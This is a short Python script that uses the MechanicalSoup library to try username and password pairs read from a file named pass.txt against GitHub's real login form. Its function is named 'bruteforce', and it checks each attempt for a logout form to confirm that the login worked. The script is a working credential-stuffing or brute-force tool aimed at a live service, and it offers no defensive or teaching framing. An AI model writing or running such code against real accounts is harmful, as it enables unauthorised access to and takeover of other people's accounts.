import argparse
from getpass import getpass

import mechanicalsoup


def bruteforce(username, password):
    browser = mechanicalsoup.StatefulBrowser()
    # browser.set_verbose(2)

    browser.open("https://github.com")
    browser.follow_link("login")
    browser.select_form('#login form')
    browser["login"] = username
    browser["password"] = password
    resp = browser.submit_selected()

    # Uncomment to launch a web browser on the current page:
    # browser.launch_browser()

    # verify we are now logged in
    page = browser.get_current_page()
    messages = page.find("div", class_="flash-messages")
    if messages:
        print(messages.text)
    assert page.select(".logout-form")

    print(page.title.text)

    # verify we remain logged in (thanks to cookies) as we browse the rest of
    # the site
    page3 = browser.open("https://github.com/MechanicalSoup/MechanicalSoup")
    assert page3.soup.select(".logout-form")

def main():

    with open('pass.txt') as fp:
        passList = fp.readlines()

    for item in passList:
        username, password = item.strip().split(",")
        bruteforce(username, password)


if __name__ == '__main__':
    main()